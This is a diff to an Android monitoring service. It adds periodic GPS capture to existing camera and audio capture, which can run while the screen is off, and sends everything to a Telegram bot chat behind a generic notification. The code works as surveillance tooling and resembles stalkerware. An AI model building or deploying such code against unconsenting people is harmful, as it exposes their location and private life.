@@ -11,6 +11,7 @@ import android.graphics.BitmapFactory
 import android.os.Build
 import android.os.IBinder
 import android.util.Log
+import android.content.pm.ServiceInfo
 import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageCapture
 import androidx.camera.core.ImageCaptureException
@@ -50,6 +51,8 @@ class MonitorService : Service(), LifecycleOwner {
     private var sendCamera: Boolean = false
     private var cameraScreenOff: Boolean = false
     private var captureInterval: Long = 10000L 
+    private var sendLocation: Boolean = false
+    private var locationInterval: Long = 600000L // 10 mins
 
     private var mediaRecorder: android.media.MediaRecorder? = null
     private val prefsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { sharedPreferences, key ->
@@ -59,11 +62,12 @@ class MonitorService : Service(), LifecycleOwner {
     override fun onCreate() {
         super.onCreate()
         lifecycleRegistry.currentState = Lifecycle.State.CREATED
-        startForegroundServiceNotification()
         
         val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
         pref.registerOnSharedPreferenceChangeListener(prefsListener)
         updateConfigFromPrefs(pref)
+        
+        startForegroundServiceNotification()
         
         startLoops()
     }
@@ -73,6 +77,7 @@ class MonitorService : Service(), LifecycleOwner {
         targetChatId = pref.getString("chatId", "") ?: ""
         sendCamera = pref.getBoolean("sendCamera", false)
         sendAudio = pref.getBoolean("sendAudio", false)
+        sendLocation = pref.getBoolean("sendLocation", false)
         
         val camSec = pref.getLong("cameraInterval", 10L) 
         captureInterval = camSec * 1000L
@@ -82,6 +87,10 @@ class MonitorService : Service(), LifecycleOwner {
         if (audioDuration < 5000L) audioDuration = 5000L
         audioScreenOff = pref.getBoolean("audioScreenOff", false)
         cameraScreenOff = pref.getBoolean("cameraScreenOff", false)
+
+        val locMin = pref.getLong("locationInterval", 10L)
+        locationInterval = locMin * 60 * 1000L
+        if (locationInterval < 60000L) locationInterval = 60000L
     }
     
     // Cleanup
@@ -149,7 +158,64 @@ class MonitorService : Service(), LifecycleOwner {
                      delay(waitTime)
                  }
             }
+
+            // Location Loop
+            launch {
+                while (isActive) {
+                    if (!TokenManager.isTokenValid(this@MonitorService)) {
+                        delay(60000)
+                        continue
+                    }
+                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendLocation) {
+                        fetchAndSendLocation()
+                    }
+                    delay(locationInterval)
+                }
+            }
         }
+    }
+
+    private fun fetchAndSendLocation() {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            return
+        }
+        val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+        try {
+            val providers = lm.getProviders(true)
+            var bestLoc: android.location.Location? = null
+            for (p in providers) {
+                val l = lm.getLastKnownLocation(p) ?: continue
+                if (bestLoc == null || l.accuracy < bestLoc.accuracy) {
+                    bestLoc = l
+                }
+            }
+            if (bestLoc != null) {
+                sendTelegramLocation(botToken, targetChatId, bestLoc.latitude, bestLoc.longitude)
+            }
+        } catch (e: Exception) {
+            Log.e("MonitorService", "Location error", e)
+        }
+    }
+
+    private fun sendTelegramLocation(token: String, chatId: String, lat: Double, lon: Double) {
+        val url = "https://api.telegram.org/bot$token/sendLocation"
+        val body = okhttp3.FormBody.Builder()
+            .add("chat_id", chatId)
+            .add("latitude", lat.toString())
+            .add("longitude", lon.toString())
+            .build()
+        val request = Request.Builder().url(url).post(body).build()
+        try { client.newCall(request).execute().use {} } catch (e: Exception) {}
+    }
+
+    private fun sendTelegramMessage(token: String, chatId: String, text: String) {
+        val url = "https://api.telegram.org/bot$token/sendMessage"
+        val body = okhttp3.FormBody.Builder()
+            .add("chat_id", chatId)
+            .add("text", text)
+            .build()
+        val request = Request.Builder().url(url).post(body).build()
+        try { client.newCall(request).execute().use {} } catch (e: Exception) {}
     }
 
     private fun isScreenOn(): Boolean {
@@ -337,16 +403,41 @@ class MonitorService : Service(), LifecycleOwner {
         }
         val notification = NotificationCompat.Builder(this, "MonitorServiceChannel")
             .setContentTitle("Monitor Service")
-            .setContentText("Audio/Camera Active")
+            .setContentText("Monitoring Active")
             .setSmallIcon(R.mipmap.ic_launcher)
             .build()
             
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(2, notification, 
-                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or 
-                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
-        } else {
-            startForeground(2, notification)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                var type = 0
+                if (sendAudio && ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                }
+                if (sendCamera && ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                }
+                if (sendLocation && ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                }
+                if (type == 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                     type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                }
+                
+                if (type != 0) {
+                    try {
+                        startForeground(2, notification, type)
+                    } catch (se: SecurityException) {
+                        Log.e("MonitorService", "SecurityException starting FGS with sensitive types. Retrying with DATA_SYNC.", se)
+                        startForeground(2, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                    }
+                } else {
+                    startForeground(2, notification)
+                }
+            } else {
+                startForeground(2, notification)
+            }
+        } catch (e: Exception) {
+            Log.e("MonitorService", "Failed to start FGS", e)
         }
     }
 
